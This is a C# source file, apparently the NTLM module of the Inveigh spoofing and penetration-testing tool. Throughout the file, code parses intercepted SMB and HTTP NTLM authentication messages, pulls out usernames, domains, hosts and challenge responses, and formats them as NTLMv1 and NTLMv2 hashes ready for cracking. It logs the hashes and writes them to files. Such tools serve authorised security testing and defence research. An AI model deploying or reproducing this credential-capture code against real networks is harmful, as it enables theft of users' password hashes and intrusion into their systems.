using System;
using System.IO;

namespace Inveigh
{
    class NTLM
    {

        public static string GetSMBNTLMChallenge(byte[] field)
        {
            string payload = BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            int index = payload.IndexOf("4E544C4D53535000");
            string challenge = "";

            if (index > 0 && payload.Substring((index + 16), 8) == "02000000")
            {
                challenge = payload.Substring((index + 48), 16);
                uint targetNameLength = Util.UInt16DataLength(((index + 24) / 2), field);
                int negotiateFlags = System.Convert.ToInt16((payload.Substring((index + 44), 2)), 16);
                string negotiateFlagsValues = Convert.ToString(negotiateFlags, 2);
                string targetInfoFlag = negotiateFlagsValues.Substring(0, 1);
                string netBIOSDomainName = "";
                string dnsComputerName = "";
                string dnsDomainName = "";

                if (targetInfoFlag == "1")
                {
                    int targetInfoIndex = ((index + 80) / 2) + (int)targetNameLength + 16;
                    byte targetInfoItemType = field[targetInfoIndex];
                    int i = 0;

                    while (targetInfoItemType != 0 && i < 10)
                    {
                        uint targetInfoItemLength = Util.UInt16DataLength((targetInfoIndex + 2), field);

                        switch (targetInfoItemType)
                        {
                            case 2:
                                netBIOSDomainName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 3:
                                dnsComputerName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 4:
                                dnsDomainName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;
                        }

                        targetInfoIndex += (int)targetInfoItemLength + 4;
                        targetInfoItemType = field[targetInfoIndex];
                        i++;
                    }

                }

            }

            return challenge;
        }

        public static void GetNTLMResponse(byte[] field, string sourceIP, string sourcePort, string protocol, string protocolPort)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("4E544C4D53535000");
            string lmResponse = "";
            string ntlmResponse = "";
            int ntlmLength = 0;
            string challenge = "";
            string domain = "";
            string user = "";
            string host = "";

            if ((String.Equals(protocol,"HTTP") || String.Equals(protocol,"Proxy") || index > 0) && payload.Substring((index + 16), 8) == "03000000")
            {
                int ntlmsspOffset = index / 2;
                int lmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 12), field);
                int lmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 16), field);
                byte[] lmPayload = new byte[lmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
                lmResponse = System.BitConverter.ToString(lmPayload).Replace("-", String.Empty);
                ntlmLength = (int)Util.UInt16DataLength((ntlmsspOffset + 20), field);
                int ntlmOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 24), field);
                byte[] ntlmPayload = new byte[ntlmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
                ntlmResponse = System.BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
                int domainLength = (int)Util.UInt16DataLength((ntlmsspOffset + 28), field);
                int domainOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 32), field);
                byte[] domainPayload = new byte[domainLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
                domain = Util.DataToString((ntlmsspOffset + domainOffset), domainLength, field);
                int userLength = (int)Util.UInt16DataLength((ntlmsspOffset + 36), field);
                int userOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 40), field);
                byte[] userPayload = new byte[userLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
                user = Util.DataToString((ntlmsspOffset + userOffset), userLength, field);
                int hostLength = (int)Util.UInt16DataLength((ntlmsspOffset + 44), field);
                int hostOffset = (int)Util.UInt32DataLength((ntlmsspOffset + 48), field);
                byte[] hostPayload = new byte[hostLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                host = Util.DataToString((ntlmsspOffset + hostOffset), hostLength, field);

                if (protocol == "SMB")
                {
                    challenge = Program.smbSessionTable[session].ToString();
                }
                else if (protocol == "HTTP")
                {
                    challenge = Program.httpSessionTable[session].ToString();
                }

                if (ntlmLength > 24)
                {
                    string ntlmV2Hash = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");

                    lock (Program.outputList)
                    {

                        if (Program.enabledSMB)
                        {

                            if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                            {


                                if (Program.enabledConsoleUnique && Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine,  "[not unique]"));
                                }
                                else
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                                    Program.outputList.Add(ntlmV2Hash);
                                }

                                if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user))))
                                {

                                    lock (Program.ntlmv2FileList)
                                    {
                                        Program.ntlmv2FileList.Add(ntlmV2Hash);
                                    }

                                    Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv2 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv2.txt")));
                                }

                                if (!Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                                {

                                    lock (Program.ntlmv2UsernameList)
                                    {
                                        Program.ntlmv2UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                    }

                                    lock (Program.ntlmv2UsernameFileList)
                                    {
                                        Program.ntlmv2UsernameFileList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                    }

                                }

                                Program.ntlmv2List.Add(ntlmV2Hash);
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[machine account]"));
                            }

                        }
                        else
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[capture disabled]"));
                        }

                    }

                }
                else if (ntlmLength == 24)
                {
                    string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;

                    lock (Program.outputList)
                    {

                        if (Program.enabledSMB)
                        {

                            if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                            {

                                if (Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[not unique]"));
                                }
                                else
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                                    Program.outputList.Add(ntlmV1Hash);
                                }

                                if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user))))
                                {

                                    lock (Program.ntlmv1FileList)
                                    {
                                        Program.ntlmv1FileList.Add(ntlmV1Hash);
                                    }

                                    Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv1 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv1.txt")));
                                }

                                if (!Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                                {

                                    lock (Program.ntlmv1UsernameList)
                                    {
                                        Program.ntlmv1UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                    }

                                    lock (Program.ntlmv1UsernameFileList)
                                    {
                                        Program.ntlmv1UsernameFileList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                    }

                                }

                                Program.ntlmv1List.Add(ntlmV1Hash);
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[machine account]"));
                            }

                        }
                        else
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:{7}{8}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[capture disabled]"));
                        }

                    }

                }
                else if(ntlmLength == 0)
                {

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLM null response from {5}({6}):{7}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                    }

                }

            }

        }

    }

}
